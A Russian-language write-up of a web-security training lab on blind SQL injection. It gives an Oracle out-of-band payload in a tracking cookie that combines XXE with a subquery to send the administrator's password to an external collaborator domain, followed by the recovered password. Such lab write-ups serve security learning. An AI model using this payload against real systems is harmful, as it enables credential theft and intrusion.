Описание:
Эта лабораторная работа содержит уязвимость слепой SQL-инъекции. Приложение использует отслеживающую cookie для аналитики и выполняет SQL-запрос, содержащий значение отправленной cookie.
SQL-запрос выполняется асинхронно и не влияет на ответ приложения.
База данных содержит другую таблицу под названием users со столбцами username и password.
Чтобы решить лабораторию, войдите как пользователь administrator.

Payload:
```
Cookie: TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT password FROM users WHERE username='administrator')||'.t1vidj0nq79tpcx1dbwqaqwm8de62wql.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

Отправка:
![](../../../z.%20Images/{0D4F7998-FEC4-4B64-B483-AE3256C2548E}.png)

Пароль: `tesfk4su5soz0a6a2b8o`

Проверка:
![](../../../z.%20Images/{91ACE1A8-56AB-4127-B7E2-9EF728B8A191}.png)